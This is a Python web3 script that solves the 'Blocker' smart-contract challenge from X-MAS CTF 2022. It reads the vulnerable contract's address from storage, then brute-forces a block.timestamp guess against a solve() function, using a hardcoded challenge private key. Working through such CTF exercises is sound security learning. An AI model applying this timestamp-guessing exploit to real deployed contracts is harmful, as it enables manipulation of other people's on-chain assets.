import web3
import time

print("Solution to Blocker challenge in X-MAS CTF 2022")
print("Sudeep Singh, Twitter @ SinghSoodeep")

rpc_url = "http://challs.htsp.ro:9001/ad8e2899-f227-4c48-83a1-17bf5d82809b"
w3 = web3.Web3(web3.Web3.HTTPProvider(rpc_url))
w3.isConnected()

setup_contract_address = "0x593EDc28F0Be694354BCe80c4b2DD991eE58E6Ca"
private_key = "0x4c93f3ae3b52d4ce27af51e8658b97e24a1f2eadb8a85cceaee0373cacca75dd"
print("Fetching account using the private key")

account = w3.eth.account.privateKeyToAccount(private_key)

print("Account address is: {}".format(account.address))

balance = w3.eth.getBalance(account.address)

abi = [{"inputs":[],"name":"current_timestamp","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_guess","type":"uint256"}],"name":"solve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"solved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}]

print("Leaking the vulnerable contract address")

vuln_contract_address =  w3.toChecksumAddress("0x" + w3.eth.get_storage_at(setup_contract_address, 0).hex()[-40:])

print("vulnerable contract address at: {}".format(vuln_contract_address))

gas_price = w3.eth.gasPrice
gas_limit = 1000000

web3.eth.defaultAccount = account.address

contract = w3.eth.contract(abi=abi, address=vuln_contract_address)

print("time analysis!!")
print("Exploit the vulnerability by bruteforcing the block.timestamp")

for i in range(100):
    before_block = w3.eth.get_block_number()
    tstamp = w3.eth.getBlock(w3.eth.get_block_number())['timestamp'] + 2
    _solved = contract.functions.solved().call()
    _current_timestamp = contract.functions.current_timestamp().call()
    print("BEFORE: block_number: {}, tstamp: {}".format(before_block, tstamp))
    print("BEFORE: solved: {}".format(_solved))
    tx_hash =  contract.functions.solve(tstamp).transact({"gasPrice": gas_price, "gas": gas_limit})
    after_block = w3.eth.get_block_number()
    after_tstamp = w3.eth.getBlock(w3.eth.get_block_number())['timestamp']
    _solved = contract.functions.solved().call()
    _current_timestamp = contract.functions.current_timestamp().call()
    print("AFTER: block_number: {}, tstamp: {}".format(after_block, after_tstamp))
    print("AFTER: solved: {}".format(_solved))
    print("time diff: {}".format(after_tstamp - tstamp))
    print("*********************************")
    time.sleep(0.5)
    if _solved == True:
        print("solved!")
        break
